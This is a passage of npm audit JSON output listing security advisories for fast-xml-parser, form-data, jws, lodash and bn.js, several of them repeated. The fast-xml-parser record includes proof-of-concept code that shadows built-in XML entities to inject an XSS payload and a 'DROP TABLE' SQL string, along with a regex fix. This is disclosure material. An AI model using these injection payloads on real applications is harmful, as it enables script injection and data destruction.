regex `/&l.;/g` where `.` matches **any character**, including the `t` in `&lt;`. Since DOCTYPE entities are replaced before built-in entities, this shadows `&lt;` entirely.\n\nThe same issue exists in `OrderedObjParser.js:81` (`addExternalEntities`), and in the v6 codebase - `EntitiesParser.js` has a `validateEntityName` function with a character blacklist, but `.` is not included:\n\n```js\n// v6 EntitiesParser.js line 96\nconst specialChar = \"!?\\\\/[]$%{}^&*()<>|+\";  // no dot\n```\n\n## Shadowing all 5 built-in entities\n\n| Entity name | Regex created | Shadows |\n|---|---|---|\n| `l.` | `/&l.;/g` | `&lt;` |\n| `g.` | `/&g.;/g` | `&gt;` |\n| `am.` | `/&am.;/g` | `&amp;` |\n| `quo.` | `/&quo.;/g` | `&quot;` |\n| `apo.` | `/&apo.;/g` | `&apos;` |\n\n## PoC\n\n```js\nconst { XMLParser } = require(\"fast-xml-parser\");\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY l. \"<img src=x onerror=alert(1)>\">\n]>\n<root>\n  <text>Hello &lt;b&gt;World&lt;/b&gt;</text>\n</root>`;\n\nconst result = new XMLParser().parse(xml);\nconsole.log(result.root.text);\n// Hello <img src=x onerror=alert(1)>b>World<img src=x onerror=alert(1)>/b>\n```\n\nNo special parser options needed - `processEntities: true` is the default.\n\nWhen an app renders `result.root.text` in a page (e.g. `innerHTML`, template interpolation, SSR), the injected `<img onerror>` fires.\n\n`&amp;` can be shadowed too:\n\n```js\nconst xml2 = `<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY am. \"'; DROP TABLE users;--\">\n]>\n<root>SELECT * FROM t WHERE name='O&amp;Brien'</root>`;\n\nconst r = new XMLParser().parse(xml2);\nconsole.log(r.root);\n// SELECT * FROM t WHERE name='O'; DROP TABLE users;--Brien'\n```\n\n## Impact\n\nThis is a complete bypass of XML entity encoding. Any application that parses untrusted XML and uses the output in HTML, SQL, or other injection-sensitive contexts is affected.\n\n- Default config, no special options\n- Attacker can replace any `&lt;` / `&gt;` / `&amp;` / `&quot;` / `&apos;` with arbitrary strings\n- Direct XSS vector when parsed XML content is rendered in a page\n- v5 and v6 both affected\n\n## Suggested fix\n\nEscape regex metacharacters before constructing the replacement regex:\n\n```js\nconst escaped = entityName.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&');\nentities[entityName] = {\n    regx: RegExp(`&${escaped};`, \"g\"),\n    val: val\n};\n```\n\nFor v6, add `.` to the blacklist in `validateEntityName`:\n\n```js\nconst specialChar = \"!?\\\\/[].{}^&*()<>|+\";\n```\n\n## Severity\n\nEntity decoding is a fundamental trust boundary in XML processing. This completely undermines it with no preconditions.","reported_by":null,"title":"fast-xml-parser has an entity encoding bypass via regex injection in DOCTYPE entity names","metadata":null,"cves":["CVE-2026-25896"],"access":"public","severity":"critical","module_name":"fast-xml-parser","vulnerable_versions":">=4.1.3 <5.3.5","github_advisory_id":"GHSA-m7jm-9gc2-mpf2","recommendation":"Upgrade to version 5.3.5 or later","patched_versions":">=5.3.5","updated":"2026-02-20T22:19:56.000Z","cvss":{"score":9.3,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N"},"cwe":["CWE-185"],"url":"https://github.com/advisories/GHSA-m7jm-9gc2-mpf2"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1109538,"path":"node-pushnotifications>node-gcm>axios>form-data","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.0.2","paths":["form-data","node-pushnotifications>node-gcm>axios>form-data"]}],"found_by":null,"deleted":null,"references":"- https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-7783\n- https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0\n- https://github.com/benweissmann/CVE-2025-7783-poc\n- https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html\n- https://github.com/advisories/GHSA-fjxv-7rqg-78g4","created":"2025-07-21T19:04:54.000Z","id":1109538,"npm_advisory_id":null,"overview":"### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.","reported_by":null,"title":"form-data uses unsafe random function in form-data for choosing boundary","metadata":null,"cves":["CVE-2025-7783"],"access":"public","severity":"critical","module_name":"form-data","vulnerable_versions":">=4.0.0 <4.0.4","github_advisory_id":"GHSA-fjxv-7rqg-78g4","recommendation":"Upgrade to version 4.0.4 or later","patched_versions":">=4.0.4","updated":"2025-11-03T21:34:09.000Z","cvss":{"score":0,"vectorString":null},"cwe":["CWE-330"],"url":"https://github.com/advisories/GHSA-fjxv-7rqg-78g4"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111243,"path":"web-push>jws","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.0.0","paths":["web-push>jws","node-pushnotifications>web-push>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>gtoken>jws","node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>google-auth-library>gtoken>jws"]}],"found_by":null,"deleted":null,"references":"- https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x\n- https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e\n- https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6\n- https://github.com/auth0/node-jws/releases/tag/v3.2.3\n- https://github.com/auth0/node-jws/releases/tag/v4.0.1\n- https://nvd.nist.gov/vuln/detail/CVE-2025-65945\n- https://github.com/advisories/GHSA-869p-cjfg-cm3x","created":"2025-12-04T16:54:15.000Z","id":1111243,"npm_advisory_id":null,"overview":"### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.","reported_by":null,"title":"auth0/node-jws Improperly Verifies HMAC Signature","metadata":null,"cves":["CVE-2025-65945"],"access":"public","severity":"high","module_name":"jws","vulnerable_versions":"=4.0.0","github_advisory_id":"GHSA-869p-cjfg-cm3x","recommendation":"Upgrade to version 4.0.1 or later","patched_versions":">=4.0.1","updated":"2025-12-04T22:50:04.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"cwe":["CWE-347"],"url":"https://github.com/advisories/GHSA-869p-cjfg-cm3x"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111243,"path":"node-pushnotifications>web-push>jws","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.0.0","paths":["web-push>jws","node-pushnotifications>web-push>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>gtoken>jws","node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>google-auth-library>gtoken>jws"]}],"found_by":null,"deleted":null,"references":"- https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x\n- https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e\n- https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6\n- https://github.com/auth0/node-jws/releases/tag/v3.2.3\n- https://github.com/auth0/node-jws/releases/tag/v4.0.1\n- https://nvd.nist.gov/vuln/detail/CVE-2025-65945\n- https://github.com/advisories/GHSA-869p-cjfg-cm3x","created":"2025-12-04T16:54:15.000Z","id":1111243,"npm_advisory_id":null,"overview":"### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.","reported_by":null,"title":"auth0/node-jws Improperly Verifies HMAC Signature","metadata":null,"cves":["CVE-2025-65945"],"access":"public","severity":"high","module_name":"jws","vulnerable_versions":"=4.0.0","github_advisory_id":"GHSA-869p-cjfg-cm3x","recommendation":"Upgrade to version 4.0.1 or later","patched_versions":">=4.0.1","updated":"2025-12-04T22:50:04.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"cwe":["CWE-347"],"url":"https://github.com/advisories/GHSA-869p-cjfg-cm3x"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111243,"path":"node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>jws","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.0.0","paths":["web-push>jws","node-pushnotifications>web-push>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>gtoken>jws","node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>google-auth-library>gtoken>jws"]}],"found_by":null,"deleted":null,"references":"- https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x\n- https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e\n- https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6\n- https://github.com/auth0/node-jws/releases/tag/v3.2.3\n- https://github.com/auth0/node-jws/releases/tag/v4.0.1\n- https://nvd.nist.gov/vuln/detail/CVE-2025-65945\n- https://github.com/advisories/GHSA-869p-cjfg-cm3x","created":"2025-12-04T16:54:15.000Z","id":1111243,"npm_advisory_id":null,"overview":"### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.","reported_by":null,"title":"auth0/node-jws Improperly Verifies HMAC Signature","metadata":null,"cves":["CVE-2025-65945"],"access":"public","severity":"high","module_name":"jws","vulnerable_versions":"=4.0.0","github_advisory_id":"GHSA-869p-cjfg-cm3x","recommendation":"Upgrade to version 4.0.1 or later","patched_versions":">=4.0.1","updated":"2025-12-04T22:50:04.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"cwe":["CWE-347"],"url":"https://github.com/advisories/GHSA-869p-cjfg-cm3x"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111243,"path":"node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>gtoken>jws","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.0.0","paths":["web-push>jws","node-pushnotifications>web-push>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>gtoken>jws","node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>google-auth-library>gtoken>jws"]}],"found_by":null,"deleted":null,"references":"- https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x\n- https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e\n- https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6\n- https://github.com/auth0/node-jws/releases/tag/v3.2.3\n- https://github.com/auth0/node-jws/releases/tag/v4.0.1\n- https://nvd.nist.gov/vuln/detail/CVE-2025-65945\n- https://github.com/advisories/GHSA-869p-cjfg-cm3x","created":"2025-12-04T16:54:15.000Z","id":1111243,"npm_advisory_id":null,"overview":"### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.","reported_by":null,"title":"auth0/node-jws Improperly Verifies HMAC Signature","metadata":null,"cves":["CVE-2025-65945"],"access":"public","severity":"high","module_name":"jws","vulnerable_versions":"=4.0.0","github_advisory_id":"GHSA-869p-cjfg-cm3x","recommendation":"Upgrade to version 4.0.1 or later","patched_versions":">=4.0.1","updated":"2025-12-04T22:50:04.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"cwe":["CWE-347"],"url":"https://github.com/advisories/GHSA-869p-cjfg-cm3x"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111243,"path":"node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>google-auth-library>gtoken>jws","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.0.0","paths":["web-push>jws","node-pushnotifications>web-push>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>jws","node-pushnotifications>firebase-admin>@google-cloud/storage>google-auth-library>gtoken>jws","node-pushnotifications>firebase-admin>@google-cloud/firestore>google-gax>google-auth-library>gtoken>jws"]}],"found_by":null,"deleted":null,"references":"- https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x\n- https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e\n- https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6\n- https://github.com/auth0/node-jws/releases/tag/v3.2.3\n- https://github.com/auth0/node-jws/releases/tag/v4.0.1\n- https://nvd.nist.gov/vuln/detail/CVE-2025-65945\n- https://github.com/advisories/GHSA-869p-cjfg-cm3x","created":"2025-12-04T16:54:15.000Z","id":1111243,"npm_advisory_id":null,"overview":"### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.","reported_by":null,"title":"auth0/node-jws Improperly Verifies HMAC Signature","metadata":null,"cves":["CVE-2025-65945"],"access":"public","severity":"high","module_name":"jws","vulnerable_versions":"=4.0.0","github_advisory_id":"GHSA-869p-cjfg-cm3x","recommendation":"Upgrade to version 4.0.1 or later","patched_versions":">=4.0.1","updated":"2025-12-04T22:50:04.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"cwe":["CWE-347"],"url":"https://github.com/advisories/GHSA-869p-cjfg-cm3x"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1111244,"path":"node-pushnotifications>firebase-admin>jsonwebtoken>jws","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"3.2.2","paths":["node-pushnotifications>@parse/node-apn>jsonwebtoken>jws"]},{"version":"3.2.2","paths":["node-pushnotifications>firebase-admin>jsonwebtoken>jws"]}],"found_by":null,"deleted":null,"references":"- https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x\n- https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e\n- https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6\n- https://github.com/auth0/node-jws/releases/tag/v3.2.3\n- https://github.com/auth0/node-jws/releases/tag/v4.0.1\n- https://nvd.nist.gov/vuln/detail/CVE-2025-65945\n- https://github.com/advisories/GHSA-869p-cjfg-cm3x","created":"2025-12-04T16:54:15.000Z","id":1111244,"npm_advisory_id":null,"overview":"### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions <=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.","reported_by":null,"title":"auth0/node-jws Improperly Verifies HMAC Signature","metadata":null,"cves":["CVE-2025-65945"],"access":"public","severity":"high","module_name":"jws","vulnerable_versions":"<3.2.3","github_advisory_id":"GHSA-869p-cjfg-cm3x","recommendation":"Upgrade to version 3.2.3 or later","patched_versions":">=3.2.3","updated":"2025-12-04T22:50:04.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"cwe":["CWE-347"],"url":"https://github.com/advisories/GHSA-869p-cjfg-cm3x"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1112455,"path":"node-pushnotifications>node-gcm>lodash","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.17.21","paths":["node-pushnotifications>node-gcm>lodash","node-pushnotifications>@parse/node-apn>jsonwebtoken>lodash"]}],"found_by":null,"deleted":null,"references":"- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg","created":"2026-01-21T23:01:22.000Z","id":1112455,"npm_advisory_id":null,"overview":"### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.","reported_by":null,"title":"Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions","metadata":null,"cves":["CVE-2025-13465"],"access":"public","severity":"moderate","module_name":"lodash","vulnerable_versions":">=4.0.0 <=4.17.22","github_advisory_id":"GHSA-xxjr-mmjv-4gpg","recommendation":"Upgrade to version 4.17.23 or later","patched_versions":">=4.17.23","updated":"2026-01-21T23:01:23.000Z","cvss":{"score":6.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"},"cwe":["CWE-1321"],"url":"https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1112455,"path":"node-pushnotifications>@parse/node-apn>jsonwebtoken>lodash","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.17.21","paths":["node-pushnotifications>node-gcm>lodash","node-pushnotifications>@parse/node-apn>jsonwebtoken>lodash"]}],"found_by":null,"deleted":null,"references":"- https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13465\n- https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81\n- https://github.com/advisories/GHSA-xxjr-mmjv-4gpg","created":"2026-01-21T23:01:22.000Z","id":1112455,"npm_advisory_id":null,"overview":"### Impact\n\nLodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. \n\nThe issue permits deletion of properties but does not allow overwriting their original behavior.  \n\n### Patches\n\nThis issue is patched on 4.17.23.","reported_by":null,"title":"Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions","metadata":null,"cves":["CVE-2025-13465"],"access":"public","severity":"moderate","module_name":"lodash","vulnerable_versions":">=4.0.0 <=4.17.22","github_advisory_id":"GHSA-xxjr-mmjv-4gpg","recommendation":"Upgrade to version 4.17.23 or later","patched_versions":">=4.17.23","updated":"2026-01-21T23:01:23.000Z","cvss":{"score":6.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L"},"cwe":["CWE-1321"],"url":"https://github.com/advisories/GHSA-xxjr-mmjv-4gpg"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1113442,"path":"web-push>asn1.js>bn.js","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.12.0","paths":["web-push>asn1.js>bn.js","node-pushnotifications>web-push>asn1.js>bn.js"]}],"found_by":null,"deleted":null,"references":"- https://nvd.nist.gov/vuln/detail/CVE-2026-2739\n- https://github.com/indutny/bn.js/issues/186\n- https://github.com/indutny/bn.js/issues/316\n- https://github.com/indutny/bn.js/pull/317\n- https://github.com/indutny/bn.js/commit/33df26b5771e824f303a79ec6407409376baa64b\n- https://gist.github.com/Kr0emer/02370d18328c28b5dd7f9ac880d22a91\n- https://security.snyk.io/vuln/SNYK-JS-BNJS-15274301\n- https://github.com/indutny/bn.js/releases/tag/v5.2.3\n- https://github.com/indutny/bn.js/issues/316#issuecomment-3924217358\n- https://github.com/advisories/GHSA-378v-28hj-76wf","created":"2026-02-20T06:30:39.000Z","id":1113442,"npm_advisory_id":null,"overview":"This affects versions of the package bn.js before 4.12.3 and 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.","reported_by":null,"title":"bn.js affected by an infinite loop","metadata":null,"cves":["CVE-2026-2739"],"access":"public","severity":"moderate","module_name":"bn.js","vulnerable_versions":"<4.12.3","github_advisory_id":"GHSA-378v-28hj-76wf","recommendation":"Upgrade to version 4.12.3 or later","patched_versions":">=4.12.3","updated":"2026-02-24T14:45:54.000Z","cvss":{"score":5.3,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"},"cwe":["CWE-835"],"url":"https://github.com/advisories/GHSA-378v-28hj-76wf"}}}
{"type":"auditAdvisory","data":{"resolution":{"id":1113442,"path":"node-pushnotifications>web-push>asn1.js>bn.js","dev":false,"optional":false,"bundled":false},"advisory":{"findings":[{"version":"4.12.0","paths":["web-push>asn1.js>bn.js","node-pushnotifications>web-push>asn1.js>bn.js"]}],"found_by":null,"deleted":null,"references":"- https://nvd.nist.gov/vuln/detail/CVE-2026-2739\n- https://github.com/indutny/bn.js/issues/186\n- https://github.com/indutny/bn.js/issues/316\n- https://github.com/indutny/bn.js/pull/317\n- https://github.com/indutny/bn.js/commit/33df26b5771e824f303a79ec6407409376baa64b\n- https://gist.github.com/Kr0emer/02370d18328c28b5dd7f9ac880d22a91\n- https://security.snyk.io/vuln/SNYK-JS-BNJS-15274301\n- https://github.com/indutny/bn.js/releases/tag/v5.2.3\n- https://github.com/indutny/bn.js/issues/316#issuecomment-3924217358\n- https://github.com/advisories/GHSA-378v-28hj-76wf","created":"2026-02-20T06:30:39.000Z","id":1113442,"npm_advisory_id":null,"overview":"This affects versions of the package bn.js before 4.12.3 and 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.","reported_by":null,"title":"bn.js affected by an infinite loop","metadata":null,"cves":["CVE-2026-2739"],"access":"public","severity":"moderate","module_name":"bn.js","vulnerable_versions":"<4.12.3","github_advisory_id":"GHSA-378v-28hj-76wf","recommendation":"Upgrade to version 4.12.3 or later","patched_versions":">=4.12.3","updated":"2026-02-24T14:45:54.000Z","cvss":{"score":5.3,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"},"cwe":["CWE-835"],"url":"https://github.com/advisories/GHSA-378v-28hj-76wf"}}}
